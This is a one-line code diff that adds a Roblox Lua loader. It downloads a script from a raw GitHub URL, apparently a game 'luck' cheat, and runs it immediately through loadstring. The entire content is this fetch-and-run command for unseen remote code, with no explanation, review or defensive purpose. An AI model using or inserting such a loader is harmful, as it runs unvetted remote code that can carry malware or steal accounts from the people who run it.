@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vOlOrex/100XLUCK1/refs/heads/main/LUCK_script"))()
